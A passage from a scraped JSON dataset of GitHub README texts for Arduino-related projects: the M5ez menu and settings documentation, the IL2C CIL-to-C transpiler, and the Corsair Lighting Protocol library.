mainmenu_wifi);\nimages.additem(about_jpg, \"about m5ez\", aboutm5ez);\nimages.additem(sleep_jpg, \"power off\", poweroff);\nimages.additem(return_jpg, \"back\");\nimages.run();\n}\nas you can see we simply call additem() with the name of the byte array that holds the encoded jpg file, a name to be used as a caption on the image and a function to be executed.\nmenus: all the functions documented\nas you will see in the function documentation below, there is much more you can do with menus, like adding and deleting items on the fly. and if you draw different buttons, it's important to know that any button not named \"up\" or \"down\" selects the currently highlighted item. you might, for instance, create a button or button combination named \"info\" that provides more information about the current selection. there is also an advanced function you can pass that has access to more data and that can cause the menu to exit.\nezmenu yourmenu(string header)\nezmenu yourmenu\nif you issue on of these statements, you are creating an instance of the ezmenu object called \"yourmenu\". this will allow you to reference it when you start adding items to it, change various properties of it. eventually your code will run the menu, which means it will display on the screen. \"yourmenu\" should of course be replaced by any name of your choice, but we'll use it in this text to show all the functions that apply to menus. these functions should be called with the name of the menu followed by a dot in front of them, as they are \"member functions\" of the ezmenu object.\nbool additem(string nameandcaption,\nvoid (*simplefunction)() = null,\nbool (*advancedfunction)(ezmenu* callingmenu) = null,\nvoid (*drawfunction)(ezmenu* callingmenu, int16_t x, int16_t y, int16_t w, int16_t h) = null)\nbool additem(const char *image, string nameandcaption,\nvoid (*simplefunction)() = null,\nbool (*advancedfunction)(ezmenu* callingmenu) = null,\nvoid (*drawfunction)(ezmenu* callingmenu, int16_t x, int16_t y, int16_t w, int16_t h) = null)\nbool additem(fs::fs &fs, string path, string nameandcaption,\nvoid (*simplefunction)() = null,\nbool (*advancedfunction)(ezmenu* callingmenu) = null,\nvoid (*drawfunction)(ezmenu* callingmenu, int16_t x, int16_t y, int16_t w, int16_t h) = null)\nadds items to a menu. the first form adds a text only item, the second and third forms make image menus. you can either supply a pointer to the image which is encoded as a byte array in a special .h file that you should have included, or a file system reference and a path for a file stored on sd of spiffs.\nin the latter case your sketch must do either #include <spiffs.h> and spiffs.begin() or #include <sd.h>' and 'sd.begin(), and provide both the sd or spiffs object reference as well as the path to the file. the \"imagesspiffsorsd\" example shows how to use this feature. images from program flash, spiffs and sd-card can be freely mixed in the same menu.\nthe simplefunction should be the name of a void function without parameters that will simply be executed as the menu item is picked. you supply the name of the function without the brackets here, as you are passing a pointer to the function and not the output of it.\nthe string named nameandcaption can (as the name implies) hold both a name and a caption. if you don't do anything special they are set to the same string you supply. but if you pass somename | some caption, the name is the part before the first pipe sign (|), the caption is everything after it. (spaced around the pipe sign are removed.)\nthe name is what is returned when you call yourmenu.pickname() after the menu has ran, and you can also supply it as an argument to deleteitem() (see below). the caption is what is printed, either in the item's line in the menu or as a caption with the image in an image menu. the caption is also returned by yourmenu.pickcaption().\nif you put a tab character (represented by \\t) in the caption of a menu item, the text to the left of the tab will be left-aligned to the left of the menu item, and the text to the right of it will be right-aligned to the right of the item. you can see this feature in use in m5ez's settings menu where the part on the right generally represents the actual state of a setting.\nif an item is named \"back\", \"exit\" or \"done\" (either with first letter capitalized all all lower case), the menu will exit is this item is picked, unless an advancedfunction is supplied (see below). note that while it has to be named one of these three things, it can be captioned something completely different.\nif you want your code to have more access to what just happened in the menu, you can supply an advancedfunction pointer. this way you can have a function that has access to all the member functions of the menu that called it, and it can determine whether the menu exits or not by returning true (keep running) or false (exit).\nbool myadvancedfunction(ezmenu* callingmenu) {\nserial.print( callingmenu->pickcaption() )\nif (msgbox(\"wow...\", \"are you sure?\", \"yes##no\") == \"yes\") return false;\nreturn true;\n}\nthis function will print the caption printed on the menu item that was picked, and it will ask the user whether she really wants to exit the menu, causing the calling menu to exit by returning false if she presses yes. note that items called \"back\", \"exit\" or \"done\" do not cause the menu to exit immediately if they have an advancedfunction set: in that case the decision is left to the advancedfunction.\nif you want your code to have access to the way the menus are drawn, you can supply an drawfunction pointer. the coordinates x, y, w (width) and h (height) define the rectangle where the menu is located.\nvoid mydrawfunction(ezmenu* callingmenu, int16_t x, int16_t y, int16_t w, int16_t h){\nm5.lcd.settextdatum(cl_datum);\nm5.lcd.settextcolor(ez.theme->menu_item_color);\n// new callingmenu aspect\nm5.lcd.fillroundrect(x, y, w, h, 1, tft_red);\nm5.lcd.drawstring(\"new text\",x + ez.theme->menu_item_hmargin,y + ez.fontheight() / 2 - 2);\n}\nnote that to address member functions of the calling menu in this function we need to use '->' instead of '.'. that's because we were passed a pointer to the instance, not an instance itself, but don't worry too much if you don't understand that.\nbool deleteitem(int16_t index)\nbool deleteitem(string name)\nthe first form deletes the menu item at the position indicated, starting with 1 for the first menu item. the second form allows you to delete a menu item by name. note that this will only delete the first menu item with that name. deleteitem will return true if it works, false if the name or index do not point to a valid menu item.\nbool setcaption(int16_t index, string caption)\nbool setcaption(string name, string caption)\nas the name implies, changes the caption (but not the name) of the item specified either by position or by name.\nint16_t getitemnum(string name)\nreturns the index in the menu (starting at 1) of the first menu item with the specified name, or 0 if no item with that name exists.\nvoid buttons(string bttns)\nthis allows you to pass your own buttons to the function, using the format discussed in the chapter on buttons earlier in the documentation. by default, a text menu has the buttons up # select # down defined while an image menu has left # select # right. you can provide your own button layout, moving the buttons or adding functions for long presses or key combinations. note that there is nothing special about the word \"select\". any button not named \"up\", \"down\", \"left\" or \"right\" is used to pick the current item, and you can use either an advancedfunction or .runonce() and then a call to .pickbutton() to figure out which key was pressed.\nbuttons captioned \"up\", \"down\", \"left\" or \"right\" are displayed with a triangular arrow in the corresponding direction instead of that word. buttons named \"back\", \"exit\" or \"done\" cause the menu to exit. note that menus without buttons named \"up and \"down\" (text menus) or \"left\" and \"right\" (image menus) become impossible to navigate.\nbuttons named \"first\" and \"last\" ump to the first or last item of the menu respectively.\nvoid uponfirst(string nameandcaption)\nvoid leftonfirst(string nameandcaption)\nvoid downonlast(string nameandcaption)\nvoid rightonlast(string nameandcaption)\nthese functions allow you to replace the navigation button that would navigate off the menu with something else. normally this button would just disappear. you can make menu rotate (like the main menu in the demo app) like this:\nmain.uponfirst(\"last|up\");\nmain.downonlast(\"first|down\");\nnote that the \"first\" and \"last\" are button names with special functions, and \"up\" and \"down\" are captions with special functions (they are replaced by triangle arrows). the first two and last two functions are actually synonyms: they do they same thing, it's just clearer to use the second form when creating an image menu (which is horizontal).\nvoid txtfont(const gfxfont* font)\nvoid txtbig()\nvoid txtsmall()\nthese apply to text menus only. you can set the font. the theme can supply a default big and small menu font, which can be set by simply calling .txtbig() or .txtsmall() on a menu. in the default theme, the big menu can display 6 items at a time when a header and a single row of button labels is displayed, a small menu displays eight items at a time. you can set your own font with txtfont or create a new theme with different defaults.\nvoid setsortfunction(bool (*sortfunction)(const char* s1, const char* s2))\nordinarily, menu items are displayed in the order in which they are added. however, if you are building a menu from data which you have no control over, such as a list of file names from an sd card, a sort function will ensure that the names are displayed in a specific order. you may define a sort function that takes two const char*'s and returns true when the second is greater than the first, or use one of the eight built-in sorting functions.\nbool ascendingcasesensitive(const char* s1, const char* s2) {\nreturn 0 > strcmp(s1, s2);\n}\n...\nmenu.setsortfunction(ascendingcasesensitive);\nonce set, the menu is automatically kept sorted. all calls to additem result in a sorted menu without further interaction. if setsortfunction is called after the menu has been populated, it's immediately resorted and maintained in its new order as items are added and deleted.\nnote that if your menus use captions as well as names, sorting is a bit more complicated. a set of functions is provided for sorting text in most typical manners:\nfunction purpose\nezmenu::sort_asc_name_cs sort ascending by menu name, case sensitive\nezmenu::sort_asc_name_ci sort ascending by menu name, case insensitive\nezmenu::sort_dsc_name_cs sort descending by menu name, case sensitive\nezmenu::sort_dsc_name_ci sort descending by menu name, case insensitive\nezmenu::sort_asc_caption_cs sort ascending by menu caption or name if no caption, case sensitive\nezmenu::sort_asc_caption_ci sort ascending by menu caption or name if no caption, incase sensitive\nezmenu::sort_dsc_caption_cs sort descending by menu caption or name if no caption, case sensitive\nezmenu::sort_dsc_caption_ci sort descending by menu caption or name if no caption, case insensitive\nsee the example program sortedmenus for typical usage.\nthen there are some functions that only apply to image menus\nvoid imgbackground(uint16_t color)\nthis sets a temporary background color different from the background from the theme or set manually with ez.background. this is so that background between the buttons can match the background of the images displayed. the background will return to its previous setting when the menu exits or runs any of the functions supplied with additem.\nvoid imgfromtop(int16_t offset)\nthe offset in pixels from canvastop() where the top of the image is rendered.\nvoid imgcaptionfont(const gfxfont* font)\nvoid imgcaptionlocation(uint8_t datum)\nvoid imgcaptioncolor(uint16_t color)\nvoid imgcaptionmargins(int16_t hmargin, int16_t vmargin)\nthese settings allow for the menu item caption to be printed somewhere on the canvas. the font and color options are obvious, the location is one of\nleft middle right\ntop tl_datum tc_datum tr_datum\nmiddle ml_datum mc_datum mr_datum\nbottom bl_datum bc_datum br_datum\nand the margins specify how far away from the edges of the canvas the caption is printed. the default is for no caption to be printed, you must specify all these options if you want captions.\nint16_t runonce()\nif you execute yourmenu.runonce(), the menu will show and the user can interact with it until an item is picked. then the function returns the index of the picked item (starting at one). the menu can also 'exit' (which is not the same as the .runonce() function exiting, which happens when an item is picked.\nif the user picks an item named \"back\", \"exit\" or \"done\" that does not have an advancedfunction passed.\nif the user picks any item using a button named \"back\", \"exit\" or \"done\".\nif the advancedfunction that was ran for a picked item returned false.\nin all of the above cases, .runonce will return 0. the index of the item picked will still be returned with .pick(), see below.\nvoid run()\nthe internal code for .run() is very simple:\nvoid ezmenu::run() {\nwhile (runonce()) {}\n}\nin other words: all it does is just call .runonce() on your menu until it exits for any of the reasons listed above. if your menu is the main menu of the program, you would simply not supply any items or buttons called \"exit\", \"back\" or \"done\" and have no advancedfunctions ever return false. this will cause the menu to run forever.\nint16_t pick()\nstring pickname()\nstring pickcaption()\nstring pickbutton()\nthese functions will show the position, name and caption of the picked item. they are useful after your menu has been ran once with .runonce or in an advancedfunction (see under additem above).\nsettings\nm5ez comes with a number of built-in settings menus. the settings are saved to flash in the m5ez section of the esp32 nvs facility (using the arduino preferences library). all you need to do is create one menu item that points to ez.settings.menu and all settings will be available. by commenting out certain compiler defines, menu items (and all code associated with them) can be disabled. the various menus can also be accessed directly. here's a quick table of the menus, their #define keyword, and their direct access function.\nmenu #define function\nwifi menu m5ez_wifi ez.wifi.menu\nbattery menu m5ez_battery ez.battery.menu\nclock menu m5ez_clock ez.clock.menu\nbacklight brightness m5ez_backlight ez.backlight.menu\nfaces keyboard m5ez_faces ez.faces.menu\ntheme chooser n/a ez.theme.menu\nwifi\nthe wifi menu allows the user to connect to an access point. the user can also turn on and off the \"autoconnect\" feature. with this feature on, m5ez will behave like most smartphones and automatically connect to any access point which has been added to the autoconnect list when it was joined.\nnote that this doesn't use the wifi.setautoconnect and wifi.setautoreconnect functions of the esp32 wifi library: they can only connect to one access point. instead m5ez has it's own logic for connecting, saving the ssid and password of networks you want to automatically connect to in flash.\nbelow you can see how to access the stored networks as well as the stored \"on/off\" toggle for the autoconnect feature from code. you probably won't need this as ez.wifi.menu lets the user manage all of this. note that if you do make any changes, you have to call ez.wifi.writeflash() when you are done to save them to flash.\nstd::vector<wifinetwork_t> networks\nez.wifi.networks is a vector (think of it as an array), that holds all the stored networks after m5ez boots (or ez.wifi.readflash() is executed). here's a code example to print all the ssids and their passwords to the m5ez canvas.\nfor (int8_t n = 0; n < ez.wifi.networks.size(); n++) {\nez.canvas.print(ez.wifi.networks[n].ssid);\nez.canvas.print(\": \");\nez.canvas.println(ez.wifi.networks[n].key);\n}\nvoid ez.wifi.add(string ssid, string key)\nbool ez.wifi.remove(int8_t index)\nbool ez.wifi.remove(string ssid)\nadds or removes a network. the index is the index in te networks array above.\nint8_t indexforssid(string ssid)\ncan be used to find the index for a named ssid. -1 is returned if the name is not found.\nthe weird wifi ghost button problem\nwhen you connect to wifi, on some m5stack devices, you may notice a strange quirk of the m5stack hardware, or possibly of the esp32 chip. when you are connected, the left button is getting ghost clicks. if this happens to you when you are on wifi, you will need to do the following to fix it.\nnavigate to the arduino libraries directory, and then from there to m5stack/src/utility/button.cpp. in that file (around line 60) find\npinval = digitalread(_pin);\nand replace that line with:\n// the digitalread of the button pin is commented out below.\n// the two lines below fix an issue where btna gets spurious presses if the\n// wifi is active. (the second line fixes it, the first remediates resulting\n// speaker noise.) for details: https://github.com/m5stack/m5stack/issues/52\n// pinval = digitalread(_pin);\ndacwrite(25, 0);\npinval = analogread(_pin);\nnow recompile and the problem is gone. it does mean that you cannot use the speaker while ez.buttons.poll() is checking for button presses.\nover-the-air (ota) updates via https\nyou might deploy hardware that needs updates but that you don't want to hook up via usb every time. but you will want this upload mechanism to offer some security against attackers that could otherwise compromise large numbers of internet-connected iot devices. m5ez allows you to boot from a compiled binary file that is downloaded from the internet over https.\nbool ez.wifi.update(string url, const char* root_cert, ezprogressbar* pb = null)\nstring ez.wifi.updateerror()\ntakes a url and a root certificate. a shell script called get_cert is provided in the /tools directory of this repository to get the right (non-forwarded) url and create an include file to provide the correct certificate. the optional third argument is a pointer to the ezprogressbar instance that will show the progress of the firmware download. it must be provided with a leading ampersand.\nez.wifi.update returns true if the file is downloaded and everything is set up. the next reboot - which can be forced with esp.restart() - will start the new binary. if ez.wifi.update returns false, you can use ez.wifi.updateerror() to return a string with a human-readable error message. (the way the https stream data is handled by the underlying esp32 update library does not seem terribly robust: stream timeouts happen, even on otherwise good internet connections.)\nthe readme.rd file of the ota_https sample sketch provides a step-by-step recipe that describes how to determine the url and get the certificate using get_cert.\nble\nble, short for bluetooth low energy. is intended to provide considerably reduced power consumption and cost while maintaining a similar communication range. we implemented a device manager, so you can just focus on communicate with the target device. you can access it's interface from ez.ble , and can get access to connected devices from ez.ble.getclient function.\nbattery\nthe battery menu allows you to selectively show a battery level icon in the header bar. but due to hardware limitations it can only show four different battery levels. you can access its menu from ez.battery.menu. the battery level icon is animated while charging via usb.\nclock\nif m5ez is compiled with m5ez_clock (which it is by default), it will be set up to display a clock in the header bar at the top of the screen. by default this clock displays time in a 24 hour format, but this can be changed in the clock menu, which is also accessible directly via ez.clock.menu.\nthe first time m5ez goes online, it will try to look up the timezone using the geoip country of the ip address you are connecting to the timezone server from. if this lookup fails or if you are in a country that spans multiple timezones this lookup will fail and an official timezone name will have to be set manually in the menu. (timezone names are of the from continent/some_city, see here for a list of timezone names. note that the name of the timezone has to be entered in the correct case.\nif you use m5ez with on-screen clock, your code can also use all the other features of eztime, my full-featured general purpose arduino time library.\nbacklight\nyou can set the brightness of the lcd backlight leds here. the menu is also directly accessible via ez.backlight.menu.\nfaces keyboard\nhere you can set whether or not you have a faces keyboard attached. i would have preferred to detect the keyboard automatically, but that's not easy, so it's solved with a settings menu.\nfactory defaults\nthis will erase m5ez's nvs flash section and boot, setting all m5ez settings back to their defaults.\nadding your own settings\nyou can add your own settings menu. the settings menu object ez.settings.menuobj is a regular m5ez menu, and so your own code can, at startup, add its own submenus. to show how, let's see a snippet of m5ez's own code\nez.settings.menuobj.additem(\"backlight brightness\", ez.backlight.menu);\nthat's how the backlight menu item is added to the menu.\nthemes\nincluding themes\nin the setup() part of your code, you can include themes from the themes directory. if you include multiple themes, the settings menu will show a theme chooser where the user can choose their theme. for instance, the m5ez demo program offers both the 'default' and the 'dark' theme as follows:\nvoid setup() {\n#include <themes/default.h>\n#include <themes/dark.h>\nez.begin();\n}\nand thus the settings menu offers a \"theme chooser\" option for these two themes:\nif you include no themes, the default theme is loaded as the only theme.\nmaking your own\nto make your own theme, copy the default theme from the src/themes directory to your sketch directory, rename it and change the values you want to change. the dark theme should give you an idea how to uncomment and change some of the values. make sure you at least change the 'name' property as that will be displayed in the theme chooser. now include this file in the setup() section of your sketch. since you're including from the sketch directory and not from a library use quotes and not pointy brackets, like #include \"mytheme.h\". if you spend some time to create a cool looking theme, please send it along so it can be included for everyone else to use.\nz-sketches\nwith a simple trick, you can make code that does something pretty on its own, but that can also be included to provide a submenu in a bigger program. if you look at the m5ez-demo program, you will see that its directory includes another sketch named z-sysinfo.ino. this is the same z-sysinfo.ino that can be compiled on its own. (it is in the examples directory.)\nnormally putting two .ino files in the same directory is a bad idea as the compiler then finds two programs that each have a setup() and a loop(). but if one of the programs (the \"master\" program) specifies #define main_declared and the slave program has #ifndef main_declared and #endif around its declaration of setup() and loop(), it no longer conflicts. this means the master program can call functions from it. as you can see z-sysinfo.ino also uses whether or not main_declared is defined to determine whether to provide an \"exit\" button. after all: if it is running stand-alone there is nothing to exit to.\nalso note that you do not need to #include any sketches placed in the same directory as your master program: the compiler combines them automatically. that also means you must ensure that no names are declared twice, or otherwise the compiler will complain.\nit's called a z-sketch and starts with a z because that way the arduino program that turns the .ino files into .cpp files for the compiler looks at it last, which is important. silly hack, but it is nice to able to write smaller bits of functionality that can be shown and tested individually.\ntable of contents\nm5ez the easy way to program on the m5stack\nintroduction\nother products by m5\nalternatives\nuiflow\ngetting started\nif you get fatal error: eztime.h: no such file or directory\nstructure of documentation\ntech notes\nm5ez user manual\nhow it all works\nscreen\nheader\nshowing, hiding, title\nyour own header widgets\ncanvas\ncanvas dimensions\nprinting to the canvas\nbuttons\nscheduling tasks within m5ez\nyield\nyour own events\nredrawing after an event\nshowing messages with msgbox\nezprogressbar\n3-button text input\nfaces keyboard support\ncomposing or viewing longer texts: textbox\nfonts\nfreefonts from the adafruit library\nfreefonts included by the m5stack driver\nolder fonts available only through m5ez\nusing your own fonts\nmenus\nlet's start with text menus\n.runonce()\nimage menus\nmenus: all the functions documented\nsettings\nwifi\nthe weird wifi ghost button problem\nover-the-air (ota) updates via https\nble\nbattery\nclock\nbacklight\nfaces keyboard\nfactory defaults\nadding your own settings\nthemes\nincluding themes\nmaking your own\nz-sketches\ntable of contents", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000159, "year": null}, {"Unnamed: 0": 2203, "autor": 163, "date": null, "content": "IL2C - A translator for ECMA-335 CIL/MSIL to C language.\nWhat's this?\nIL2C is a translator (transpiler) of ECMA-335 CIL/MSIL to C language.\nWe're aiming for:\nBetter predictability of runtime costs\nBetter human readability of C source code translated by IL2C.\nVery tiny footprint requirements\nWe're thinking about how to fit from large system with many resources to tiny embedded system. (KB order for the non-OSes system)\nBetter code/runtime portability\nMinimum requirement is only C99 compiler. The runtime minimum requires only the heap, CAS instructions, (POSIX) signal and setjmp/longjmp. Additional better feature is threading API (Win32, pthreads and FreeRTOS.)\nBetter interoperabilities for existed C libraries\nYou can use the standard .NET interop technics (like P/Invoke.)\nContaining seamless building systems for major C toolkits\nfor example: CMake system, Arduino IDE, VC++ ...\nSimple hello-world like code\nOriginal C# source code:\npublic static class HelloWorld\n{\npublic static void Main()\n{\nConsole.WriteLine(\"Hello world with IL2C!\");\n}\n}\nTranslated to C source code (all comments are stripped):\nIL2C_CONST_STRING(string0__, L\"Hello world with IL2C!\");\nvoid HelloWorld_Main()\n{\nstruct\n{\nconst IL2C_EXECUTION_FRAME* pNext__;\nconst uint16_t objRefCount__;\nconst uint16_t valueCount__;\nSystem_String* stack0_0__;\n} frame__ = { NULL, 1, 0 };\nil2c_link_execution_frame(&frame__);\nframe__.stack0_0__ = string0__;\nSystem_Console_WriteLine_10(frame__.stack0_0__);\nil2c_unlink_execution_frame(&frame__);\nreturn;\n}\nView with comments / other sample translation results (contain complex results)\nGetting started\nIL2C current status is experimental, read a simple \"Getting started\" for first step.\nIf you need understanding deep knowledge for IL2C, see \"Inside IL2C\" .\nProject status\nFollowing lists are auto-generated by unit test.\nSupported IL opcodes list\nSupported basic types\nSupported runtime system features\nSupported features (old)\nPackages\nPackages master devel\nIL2C.Build\nIL2C.Interop\nIL2C.Core\nIL2C.Runtime\nIL2C.Runtime.msvc\nIL2C.Runtime.Arduino (Constructing) (Constructing)\nBuild status\nConfiguration master\nPublish\nDebug\nRelease\nConfiguration devel\nPublish\nDebug\nRelease\nLicense\nUnder Apache v2.\nRelated information\nSlide: Making archive IL2C\nCovers overall information about internal IL2C.\n#6-52 session in dotNET 600 2018 conference.\nSlide: Write common, run anywhere\n#6-51 session in dotNET 600 2017 conference\nSession video (Japanese)\nPolish notation calculator: Minimum, but useful impls for \"Win32\", \"UEFI\" and \"M5Stack(ESP32)\"\nSlide: How to make the calculator / Making archive IL2C\n#6-52 session in .NET Fringe Japan 2018\nSlide: Making archive IL2C\n#6-53 session in MVP Summit F# Meetup / SEATTLE F# USERS GROUP\nSlide: Making archive IL2C\n#6-54 session in Microsoft MVP Global Summit 2018 \u2013 VS HACKATHON\"\nSession video (Japanese): \"Making archive IL2C play list\"\n\"How to create IL2C or a tool similar to IL2CPP? You see just the pure design process includes the concept.\"\n#1 session in Center CLR #6\nVideo letter (Japanese): Tested IL2C on micro:bit and arduino platform\nSession video (Japanese): Making archive IL2C\n#6-28 session in .NET Conf 2017 in Tokyo Room B\nMilestone 2+ informations (Japanese): Extensive Xamarin - Xamaritans\nincluded in the booklet \"Extensive Xamarin - Techbook Fest part 3\"\nPhotos of design process\n#6-6: Near milestones\n#6-14: Data flow analysis\nMilestone 1: Test on VC++ and check how C compiler's optimizer works.\n#6-48: How mark-and-sweep garbage collection works on a translated code.\nHow overload/override/virtual method symbol calculus work.\nHow to translate exception handlers when combined the local unwind and global unwind.\nWe are thinking about at Center CLR Try! development meetup (11/10/2018, Japanese)\nThis is the strcuture graph for the exection-frame and exception-frame.", "link": "https://github.com/kekyo/IL2C", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "il2c - a translator for ecma-335 cil/msil to c language.\nwhat's this?\nil2c is a translator (transpiler) of ecma-335 cil/msil to c language.\nwe're aiming for:\nbetter predictability of runtime costs\nbetter human readability of c source code translated by il2c.\nvery tiny footprint requirements\nwe're thinking about how to fit from large system with many resources to tiny embedded system. (kb order for the non-oses system)\nbetter code/runtime portability\nminimum requirement is only c99 compiler. the runtime minimum requires only the heap, cas instructions, (posix) signal and setjmp/longjmp. additional better feature is threading api (win32, pthreads and freertos.)\nbetter interoperabilities for existed c libraries\nyou can use the standard .net interop technics (like p/invoke.)\ncontaining seamless building systems for major c toolkits\nfor example: cmake system, arduino ide, vc++ ...\nsimple hello-world like code\noriginal c# source code:\npublic static class helloworld\n{\npublic static void main()\n{\nconsole.writeline(\"hello world with il2c!\");\n}\n}\ntranslated to c source code (all comments are stripped):\nil2c_const_string(string0__, l\"hello world with il2c!\");\nvoid helloworld_main()\n{\nstruct\n{\nconst il2c_execution_frame* pnext__;\nconst uint16_t objrefcount__;\nconst uint16_t valuecount__;\nsystem_string* stack0_0__;\n} frame__ = { null, 1, 0 };\nil2c_link_execution_frame(&frame__);\nframe__.stack0_0__ = string0__;\nsystem_console_writeline_10(frame__.stack0_0__);\nil2c_unlink_execution_frame(&frame__);\nreturn;\n}\nview with comments / other sample translation results (contain complex results)\ngetting started\nil2c current status is experimental, read a simple \"getting started\" for first step.\nif you need understanding deep knowledge for il2c, see \"inside il2c\" .\nproject status\nfollowing lists are auto-generated by unit test.\nsupported il opcodes list\nsupported basic types\nsupported runtime system features\nsupported features (old)\npackages\npackages master devel\nil2c.build\nil2c.interop\nil2c.core\nil2c.runtime\nil2c.runtime.msvc\nil2c.runtime.arduino (constructing) (constructing)\nbuild status\nconfiguration master\npublish\ndebug\nrelease\nconfiguration devel\npublish\ndebug\nrelease\nlicense\nunder apache v2.\nrelated information\nslide: making archive il2c\ncovers overall information about internal il2c.\n#6-52 session in dotnet 600 2018 conference.\nslide: write common, run anywhere\n#6-51 session in dotnet 600 2017 conference\nsession video (japanese)\npolish notation calculator: minimum, but useful impls for \"win32\", \"uefi\" and \"m5stack(esp32)\"\nslide: how to make the calculator / making archive il2c\n#6-52 session in .net fringe japan 2018\nslide: making archive il2c\n#6-53 session in mvp summit f# meetup / seattle f# users group\nslide: making archive il2c\n#6-54 session in microsoft mvp global summit 2018 \u2013 vs hackathon\"\nsession video (japanese): \"making archive il2c play list\"\n\"how to create il2c or a -----> tool !!!  similar to il2cpp? you see just the pure design process includes the concept.\"\n#1 session in center clr #6\nvideo letter (japanese): tested il2c on micro:bit and arduino platform\nsession video (japanese): making archive il2c\n#6-28 session in .net conf 2017 in tokyo room b\nmilestone 2+ informations (japanese): extensive xamarin - xamaritans\nincluded in the booklet \"extensive xamarin - techbook fest part 3\"\nphotos of design process\n#6-6: near milestones\n#6-14: data flow analysis\nmilestone 1: test on vc++ and check how c compiler's optimizer works.\n#6-48: how mark-and-sweep garbage collection works on a translated code.\nhow overload/override/virtual method symbol calculus work.\nhow to translate exception handlers when combined the local unwind and global unwind.\nwe are thinking about at center clr try! development meetup (11/10/2018, japanese)\nthis is the strcuture graph for the exection-frame and exception-frame.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000163, "year": null}, {"Unnamed: 0": 2213, "autor": 173, "date": null, "content": "Corsair Lighting Protocol\nThis library can be used to integrate custom/unofficial RGB strips with iCUE. This is not an official corsair project.\nFeatures\nAdd support of Corsair DIY device protocol to Arduino.\nControl LEDs with the Corsair iCUE software.\nSupport common LED chipsets. (e.g. WS2812B, WS2801)\nSupport FastLED.\nSupported platform: Arduino AVR\nHardware Lighting mode.\nUse multiple devices at the same time.\nRepeat or scale LED channels to arbitrary size.\nSupported Devices\nLighting Node PRO\nCommander PRO\nLighting Node CORE\nLS100 Smart Lighting Controller\nLT100 Smart Lighting Towers\nGetting started\nThis project is an Arduino library called \"Corsair Lighting Protocol\". It can be used to control Arduino boards with iCUE. This project provides example sketches for easy use with Arduino IDE.\nRequirements\nInstall the libraries\nCreate a Lighting Node PRO\nUse the Lighting Node PRO\nRequirements\nThe library is compatible with all boards using the MCU ATmega32U4. This includes Arduino Leonardo, SparkFun Pro Micro, Arduino Micro, and Adafruit 32u4 AVR Boards. It also supports the Arduino Uno and Arduino Mega, but this requires the HoodLoader2 bootloader, see this wiki for more details. It is not compatible with ATmega328 (Arduino Nano), STM8S103F3, teensy, ESP8266 and ESP32 see list of architecture/platform for a detailed description why they are not supported. In the rest of the documentation \"Arduino\" is used as a synonym for all supported boards regardless of the manufacturer.\nWhen you have problems with a board not listed here, please open an Issue.\nInstall the libraries\nTo use this library you must install it with the Library-Manager. Open the Library-Manager in Arduino IDE via Tools->Manage Libraries... Search for \"Corsair Lighting Protocol\" and install the Corsair Lighting Protocol library. This library also requires the FastLED library. Search for \"FastLED\" in the Library-Manager and install the FastLED library.\nCreate a Lighting Node PRO\nThis guide will teach you how to create a Lighting Node PRO with an Arduino Leonardo compatible board. If you have an Arduino Uno or Mega, see the other guide.\nOpen the example \"LightingNodePRO\", you can find it in Arduino IDE in the File menu->Examples->Corsair Lighting Protocol->LightingNodePRO. If you can't open the LightingNodePRO example the Corsair Lighting Protocol library is not installed correctly.\nInstall the CLP Boards. They can be installed by following the CLP Boards installation guide. After installation it should be possible to select the CLP Boards in the Arduino IDE as shown in the screenshot below. If your are using a Sparkfun Pro Micro also install the SparkFun Boards definition.\nUpload the \"LightingNodePRO\" sketch to your Arduino.\nDo the wiring. For more information on how to wire the leds and how to set up the LEDs in the code see the links.\nVerify your device works as expected. Open the Windows settings->devices->Other devices. Somewhere in the list of devices, there should be a device called \"Lighting Node PRO\".\nNow open iCUE there you should see the \"Lighting Node PRO\".\nIf you have any problem during setup you may find the solution in the Troubleshooting section.\nUse the Lighting Node PRO\nIn iCUE open the \"Lighting Setup\" tab of the Lighting Node PRO(LNP) and set for both Lighting Channels the device to \"RGB Light Strip\" and the amount to a tenth of the LEDs you have. iCUE groups the LEDs into groups of ten. So if you have 20 LEDs, set the amount to 2. Now you can create lighting effects in the \"Lighting Channel #\" tabs.\nDocumentation\nAPI Documentation\nHow it works\nUse of multiple devices\nRepeat or scale LED channels\nIncrease the Brightness of the LEDs\nHardware Lighting mode\nHow it works\nThis library uses the USB HID interface of the ATmega32U4. After uploading a sketch with the library and selected CLP Boards, iCUE recognizes the Arduino as a Corsair device, because the CLP Boards use USB IDs of Corsair. In iCUE you can then select the device and set some lighting effects. iCUE sends these via the HID protocol to the Arduino. These commands are understood by the library and converted into lighting effects on the RGB strips connected to the Arduino. The FastLED library is used to control the LEDs.\nUse of multiple devices\nEach device has two unique IDs, that is, they should be unique. You must give each device a unique ID. There are two IDs that must be changed Serial Number and DeviceID.\nThe Serial Number can be set in the constructor of CorsairLightingProtocolHID and CLPUSBSerialBridge as shown in the example.\nconst char mySerialNumber[] PROGMEM = \"202B6949A967\";\nCorsairLightingProtocolHID cHID(&cLP, mySerialNumber);\nThe Serial Number MAY only consist of HEX characters (0-9 and A-F).\nThe DeviceID can be set with the setDeviceID function of CorsairLightingFirmware.\nvoid setup() {\nbyte deviceId[4] = { 0x9A, 0xDA, 0xA7, 0x8E };\nfirmware.setDeviceID(deviceId);\n...\n}\nAlternative\nThe DeviceID can be changed with the DeviceIDTool. Upload the DeviceIDTool sketch and then open the Serial monitor with baudrate 115200. The tool displays the current DeviceID, you can type in a new DeviceID that is saved on the Arduino. After that, you can upload another sketch.\nRepeat or scale LED channels\nYou can repeat or scale LED channel controlled by iCUE onto physical LED strips. This is very useful if you have very long LED strips that are longer than 60/96/135 LEDs, which is the maximum number iCUE supports.\nTo repeat or scale a LED channel you must apply the CLP::repeat or the CLP:scale function in the update hook of the FastLEDController. See the RepeatAndScale example for the complete code. Both functions take the FastLEDController pointer and the channel index as arguments. Additionally, the repeat function takes as an argument how often the LED channel should be repeated. For example, if you want to duplicate the channel you must pass 2 as argument. The scale function takes as third argument the length of the physical LED strip to which it scales the channel using integer scaling. For example you have 144 physical LEDs on you strip and 60 on the LED channel. Then the third argument of the scale function is 144.\nFor both functions it's important, that the CRGB arrays have at least the length of the physical LED strip. This means if your LED channel from iCUE has 50 LEDs and you use the repeat function to control 100 physical LEDs you MUST declare the CRGB array at least with a length of 100.\nIncrease the Brightness of the LEDs\nWhen using LS100 or LT100 iCUE only uses 50% of the 